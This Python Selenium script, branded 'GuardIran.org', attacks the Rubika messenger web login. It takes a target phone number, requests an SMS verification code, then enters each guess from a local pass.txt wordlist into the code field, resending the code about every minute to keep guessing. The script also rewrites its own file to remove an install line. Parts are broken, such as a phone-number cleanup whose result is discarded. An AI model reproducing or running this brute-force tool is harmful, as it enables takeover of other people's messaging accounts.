from selenium import webdriver as wb
import time,platform,os
from pyfiglet import figlet_format as font
def Rubika():
    requireme=os.system('pip install -r requirements.txt')
    with open('./run.py') as reader:
        new_file_=reader.read().replace("    requireme=os.system('pip install -r requirements.txt')","")
    with open('./run.py','w') as writed:
        writed.write(new_file_)
    def CLEAR():
        print(font('GuardIran.org'))
    os_INFO=platform.uname()
    if 'Windows' in os_INFO:
        os.system('cls')
        CLEAR()
    else:
        pass
    print(' [+]  for example 9129871234 ...\n')
    Number_CellPhone = input(' [~] please Enter The number cellphone : > ')
    if ' ' in Number_CellPhone:
        Number_CellPhone.replace(' ','').replace('0','').replace('+98','')
    drive=wb.Firefox()
    drive.get('https://web.rubika.ir/#/login')
    time.sleep(2)
    drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[1]/div/div[3]/div[3]/input[1]').send_keys(Number_CellPhone)
    drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[1]/div/div[3]/button/div/div').click()
    time.sleep(4)
    stop=time.time()+61
    with open('./pass.txt','r') as passlist:
        try:
            for i in passlist.read().split():
                if stop<=time.time():
                    stop=time.time()+62
                    drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[3]/p/a/span').click()
                    time.sleep(.1)
                    print('\n\n         >>>>>>   UPDATE   TIME  <<<<<<\n\n')

                print(f'\n\n\n                      TEST CODE {i} ON  +98{Number_CellPhone}')
                #drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').click()
                drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').send_keys(str(i))
                drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').clear()
        except:
            pass
Rubika()
